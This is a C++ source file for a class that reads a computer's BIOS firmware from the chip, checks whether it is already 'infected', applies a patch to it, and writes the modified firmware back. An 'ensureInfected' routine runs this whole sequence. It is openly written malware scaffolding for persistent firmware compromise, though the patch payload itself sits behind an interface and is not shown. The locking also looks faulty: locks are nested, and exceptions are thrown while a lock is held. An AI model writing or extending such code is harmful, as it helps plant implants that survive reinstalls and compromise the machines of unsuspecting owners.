#include "Bios.hpp"
#include "logs/LogLevel.hpp"
#include "exceptions/IllegalStateException.hpp"

Bios::Bios(Log * pLog) {
	this->pLog = pLog;
}
void Bios::setBiosIO(IBiosIO *pBiosIO) {
    this->pBiosIO = pBiosIO;
}
void Bios::setPatch(IPatch *pPatch) {
    this->pPatch = pPatch;
}

void Bios::read() {
    lock.lock();
	pLog->logMessage(INFO, "starting to read BIOS code from chip");
    biosBytesVector.init(pBiosIO->readAsBytes());
    lock.unlock();
}
bool Bios::isReaded() {
    lock.lock();
    bool result = !biosBytesVector.isEmpty();
    lock.unlock();
    return result;
}
void Bios::write() {
    lock.lock();
    if(!isReaded()) {
        throw IllegalStateException("trying to write BIOS which have not been read");
    }
    if (!biosBytesVector.isModified()) {
        throw IllegalStateException("trying to write BIOS which have not been modified");
    }
	pLog->logMessage(INFO, "writing BIOS code to chip");
    pBiosIO->writeFromBytesArray(biosBytesVector.asArray());
    lock.unlock();
}
bool Bios::isInfected() {
    lock.lock();
    pLog->logMessage(INFO, "checking whether BIOS code is infected");
    if(!isReaded() || !biosBytesVector.isModified()) {
        read();
    }			
    bool isInfected = pPatch->isPatched(biosBytesVector);
    if(isInfected) {
        pLog->logMessage(INFO, "BIOS code is already infected");
    } else {
        pLog->logMessage(INFO, "BIOS code is not infected");
    }
    lock.unlock();
    return isInfected;
}
void Bios::infect() {
    lock.lock();
	pLog->logMessage(INFO, "infecting BIOS code");
    if (!isReaded()) {
        read();
    }
    if (isInfected()) {
        throw IllegalStateException("trying to infect already infected BIOS");
    }
    pPatch->patch(biosBytesVector);
    lock.unlock();
}
void Bios::ensureInfected() {
    lock.lock();
	read();
	if (!isInfected()) {
		infect();
		write();
	}
    lock.unlock();
}

void Bios::clear() {
    lock.lock();
    biosBytesVector.clear();
    lock.unlock();
}
